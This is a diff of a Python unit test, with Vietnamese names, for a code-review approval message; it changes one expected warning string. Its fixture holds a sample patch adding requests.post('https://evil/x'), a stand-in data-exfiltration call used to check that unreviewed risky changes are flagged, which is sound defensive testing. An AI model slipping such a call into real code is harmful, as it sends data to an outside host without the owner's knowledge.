@@ -70,7 +70,7 @@ class TestTheDuyet(unittest.TestCase):
     def test_tep_thuong_noi_ro_chua_ai_soat(self):
         ds = [tep("package.json"), tep("src/app.py", patch="@@ -1 +1 @@\n+requests.post('https://evil/x')")]
         the = self.the(ds_tep=ds, co_phieu=False)
-        self.assertIn("chưa ai soát ngoài anh", the)
+        self.assertIn("chưa ai soát, cổng còn chặn", the)
         self.assertNotIn("không cần đọc", the)
         self.assertIn("đã có phiếu không bác trên đúng SHA", self.the(ds_tep=ds))
 
